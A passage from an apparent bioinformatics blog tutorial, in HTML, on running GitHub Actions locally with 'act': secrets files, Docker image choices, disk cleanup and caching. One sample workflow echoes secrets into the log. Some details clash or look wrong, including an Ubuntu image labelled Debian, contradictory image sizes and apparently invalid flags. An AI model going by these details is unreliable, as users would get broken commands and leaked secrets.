60%)">:</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">      </span><span class="token property" style="color:hsl(5, 74%, 59%)">"login"</span><span class="token operator" style="color:hsl(221, 87%, 60%)">:</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"myusername"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">}</span><br></span></code></pre></div></div>
<p><strong>Method 2: <code>.actrc</code> file</strong> (in repo root)</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># .actrc</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-P</span><span class="token plain"> ubuntu-latest</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain">ghcr.io/catthehacker/ubuntu:act-latest</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-l</span><br></span></code></pre></div></div>
<p><strong>Method 3: Shell environment variables</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">export</span><span class="token plain"> </span><span class="token assign-left variable" style="color:hsl(221, 87%, 60%)">MY_VAR</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token string" style="color:hsl(119, 34%, 47%)">"value"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">export</span><span class="token plain"> </span><span class="token assign-left variable" style="color:hsl(221, 87%, 60%)">ANOTHER_VAR</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token string" style="color:hsl(119, 34%, 47%)">"another"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">act push</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="working-with-secrets">Working with Secrets<a href="https://riverxdata.github.io/river-docs/blog/cicd-bioinformatics-act-local-github-action#working-with-secrets" class="hash-link" aria-label="Direct link to Working with Secrets" title="Direct link to Working with Secrets" translate="no">​</a></h3>
<p>GitHub Actions use <code>secrets</code> for sensitive data. With <code>act</code>, you can pass secrets locally:</p>
<p><strong>Method 1: <code>.secrets</code> file</strong> (in repo root)</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># .secrets</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token assign-left variable" style="color:hsl(221, 87%, 60%)">MY_SECRET</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain">super_secret_value</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token assign-left variable" style="color:hsl(221, 87%, 60%)">GITHUB_TOKEN</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain">ghp_xxxxxxxxxxxxxxxxxxxx</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token assign-left variable" style="color:hsl(221, 87%, 60%)">API_KEY</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain">your_api_key_here</span><br></span></code></pre></div></div>
<p><strong>Important:</strong> Add <code>.secrets</code> to <code>.gitignore</code> to prevent committing secrets!</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">echo</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">".secrets"</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&gt;&gt;</span><span class="token plain"> .gitignore</span><br></span></code></pre></div></div>
<p><strong>Method 2: Command-line secret flag</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">act </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-s</span><span class="token plain"> </span><span class="token assign-left variable" style="color:hsl(221, 87%, 60%)">MY_SECRET</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain">value </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-s</span><span class="token plain"> </span><span class="token assign-left variable" style="color:hsl(221, 87%, 60%)">GITHUB_TOKEN</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain">token</span><br></span></code></pre></div></div>
<p><strong>Workflow using secrets:</strong></p>
<div class="language-yaml codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-yaml codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token key atrule" style="color:hsl(35, 99%, 36%)">jobs</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  </span><span class="token key atrule" style="color:hsl(35, 99%, 36%)">deploy</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token key atrule" style="color:hsl(35, 99%, 36%)">runs-on</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> ubuntu</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">-</span><span class="token plain">latest</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token key atrule" style="color:hsl(35, 99%, 36%)">steps</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">      </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">-</span><span class="token plain"> </span><span class="token key atrule" style="color:hsl(35, 99%, 36%)">uses</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> actions/checkout@v3</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">      </span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">      </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">-</span><span class="token plain"> </span><span class="token key atrule" style="color:hsl(35, 99%, 36%)">name</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> Use secret</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token key atrule" style="color:hsl(35, 99%, 36%)">run</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">|</span><span class="token scalar string" style="color:hsl(119, 34%, 47%)"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token scalar string" style="color:hsl(119, 34%, 47%)">          echo "API Key: ${{ secrets.API_KEY }}"</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token scalar string" style="color:hsl(119, 34%, 47%)">          echo "Token: ${{ secrets.GITHUB_TOKEN }}"</span><br></span></code></pre></div></div>
<p><strong>Run with secrets:</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">act --secret-file .secrets</span><br></span></code></pre></div></div>
<hr>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="part-4-docker-and-container-management">Part 4: Docker and Container Management<a href="https://riverxdata.github.io/river-docs/blog/cicd-bioinformatics-act-local-github-action#part-4-docker-and-container-management" class="hash-link" aria-label="Direct link to Part 4: Docker and Container Management" title="Direct link to Part 4: Docker and Container Management" translate="no">​</a></h2>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="understanding-act-container-images">Understanding <code>act</code> Container Images<a href="https://riverxdata.github.io/river-docs/blog/cicd-bioinformatics-act-local-github-action#understanding-act-container-images" class="hash-link" aria-label="Direct link to understanding-act-container-images" title="Direct link to understanding-act-container-images" translate="no">​</a></h3>
<p><code>act</code> uses pre-built Docker images that mimic GitHub's cloud runners. Default images are large (~15GB) but highly compatible.</p>
<p><strong>Available Docker images:</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># Ubuntu (recommended for bioinformatics)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">ghcr.io/catthehacker/ubuntu:act-latest</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Debian (smaller, faster)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">ghcr.io/catthehacker/ubuntu:full-latest</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Minimal (smallest, fast)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">ubuntu:latest  </span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Docker Hub</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="specifying-docker-images">Specifying Docker Images<a href="https://riverxdata.github.io/river-docs/blog/cicd-bioinformatics-act-local-github-action#specifying-docker-images" class="hash-link" aria-label="Direct link to Specifying Docker Images" title="Direct link to Specifying Docker Images" translate="no">​</a></h3>
<p><strong>Method 1: <code>-P</code> flag in command</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">act </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-P</span><span class="token plain"> ubuntu-latest</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain">ghcr.io/catthehacker/ubuntu:full-latest</span><br></span></code></pre></div></div>
<p><strong>Method 2: <code>.actrc</code> file</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># .actrc</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-P</span><span class="token plain"> ubuntu-latest</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain">ghcr.io/catthehacker/ubuntu:full-latest</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-P</span><span class="token plain"> windows-latest</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain">ghcr.io/catthehacker/windows:full-latest</span><br></span></code></pre></div></div>
<p><strong>Method 3: Command-line shorthand</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># Use minimal image</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">act --container-architecture linux/amd64</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="pre-pulling-docker-images">Pre-pulling Docker Images<a href="https://riverxdata.github.io/river-docs/blog/cicd-bioinformatics-act-local-github-action#pre-pulling-docker-images" class="hash-link" aria-label="Direct link to Pre-pulling Docker Images" title="Direct link to Pre-pulling Docker Images" translate="no">​</a></h3>
<p>Large images take time on first run. Pre-pull them:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># Pull the image once</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">docker</span><span class="token plain"> pull ghcr.io/catthehacker/ubuntu:act-latest</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Now act will use cached image (much faster)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">act push</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="managing-disk-space">Managing Disk Space<a href="https://riverxdata.github.io/river-docs/blog/cicd-bioinformatics-act-local-github-action#managing-disk-space" class="hash-link" aria-label="Direct link to Managing Disk Space" title="Direct link to Managing Disk Space" translate="no">​</a></h3>
<p>Docker images consume significant space. Clean up unused images:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># Remove unused images</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">docker</span><span class="token plain"> image prune </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-a</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Remove all containers</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">docker</span><span class="token plain"> container prune </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-a</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Check disk usage</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">docker</span><span class="token plain"> system </span><span class="token function" style="color:hsl(221, 87%, 60%)">df</span><br></span></code></pre></div></div>
<hr>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="part-5-performance-optimization-tips">Part 5: Performance Optimization Tips<a href="https://riverxdata.github.io/river-docs/blog/cicd-bioinformatics-act-local-github-action#part-5-performance-optimization-tips" class="hash-link" aria-label="Direct link to Part 5: Performance Optimization Tips" title="Direct link to Part 5: Performance Optimization Tips" translate="no">​</a></h2>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="1-use-smaller-docker-images">1. Use Smaller Docker Images<a href="https://riverxdata.github.io/river-docs/blog/cicd-bioinformatics-act-local-github-action#1-use-smaller-docker-images" class="hash-link" aria-label="Direct link to 1. Use Smaller Docker Images" title="Direct link to 1. Use Smaller Docker Images" translate="no">​</a></h3>
<p>Instead of full Ubuntu, use minimal images:</p>
<p><strong>Before (slow - ~15GB):</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">act </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-P</span><span class="token plain"> ubuntu-latest</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain">ghcr.io/catthehacker/ubuntu:act-latest</span><br></span></code></pre></div></div>
<p><strong>After (fast - ~2GB):</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">act </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-P</span><span class="token plain"> ubuntu-latest</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain">ghcr.io/catthehacker/ubuntu:full-latest</span><br></span></code></pre></div></div>
<p><strong>Performance impact:</strong> ~2-3x faster</p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="2-cache-dependencies">2. Cache Dependencies<a href="https://riverxdata.github.io/river-docs/blog/cicd-bioinformatics-act-local-github-action#2-cache-dependencies" class="hash-link" aria-label="Direct link to 2. Cache Dependencies" title="Direct link to 2. Cache Dependencies" translate="no">​</a></h3>
<p>GitHub Actions support caching. Leverage it in <code>act</code>:</p>
<p><strong>Workflow with caching:</strong></p>
<div class="language-yaml codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-yaml codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token key atrule" style="color:hsl(35, 99%, 36%)">jobs</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  </span><span class="token key atrule" style="color:hsl(35, 99%, 36%)">test</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token key atrule" style="color:hsl(35, 99%, 36%)">runs-on</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> ubuntu</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">-</span><span class="token plain">latest</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token key atrule" style="color:hsl(35, 99%, 36%)">steps</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">      </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">-</span><span class="token plain"> </span><span class="token key atrule" style="color:hsl(35, 99%, 36%)">uses</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> actions/checkout@v3</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">      </span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">      </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">-</span><span class="token plain"> </span><span class="token key atrule" style="color:hsl(35, 99%, 36%)">name</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> Cache pip dependencies</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token key atrule" style="color:hsl(35, 99%, 36%)">uses</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> actions/cache@v3</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token key atrule" style="color:hsl(35, 99%, 36%)">with</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">          </span><span class="token key atrule" style="color:hsl(35, 99%, 36%)">path</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> ~/.cache/pip</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">          </span><span class="token key atrule" style="color:hsl(35, 99%, 36%)">key</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> $</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token plain"> runner.os </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">-</span><span class="token plain">pip</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">-</span><span class="token plain">$</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token plain"> hashFiles('</span><span class="token important" style="color:hsl(230, 8%, 24%);font-weight:bold">**/requirements.txt')</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">          </span><span class="token key atrule" style="color:hsl(35, 99%, 36%)">restore-keys</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">|</span><span class="token scalar string" style="color:hsl(119, 34%, 47%)"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token scalar string" style="color:hsl(119, 34%, 47%)">            ${{ runner.os }}-pip-</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">      </span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">      </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">-</span><span class="token plain"> </span><span class="token key atrule" style="color:hsl(35, 99%, 36%)">name</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> Install Python dependencies</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token key atrule" style="color:hsl(35, 99%, 36%)">run</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> pip install </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">-</span><span class="token plain">r requirements.txt</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">      </span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">      </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">-</span><span class="token plain"> </span><span class="token key atrule" style="color:hsl(35, 99%, 36%)">name</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> Run tests</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token key atrule" style="color:hsl(35, 99%, 36%)">run</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> pytest tests/</span><br></span></code></pre></div></div>
<p><strong>Performance impact:</strong> First run ~30s, subsequent runs ~5s (cache hit)</p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="3-run-jobs-in-parallel">3. Run Jobs in Parallel<a href="https://riverxdata.github.io/river-docs/blog/cicd-bioinformatics-act-local-github-action#3-run-jobs-in-parallel" class="hash-link" aria-label="Direct link to 3. Run Jobs in Parallel" title="Direct link to 3. Run Jobs in Parallel" translate="no">​</a></h3>
<p>By default, <code>act</code> runs jobs sequentially. Enable parallel execution:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># Run all jobs in parallel</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">act </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">--parallel</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">4</span><br></span></code></pre></div></div>
<p><strong>Workflow with multiple jobs:</strong></p>
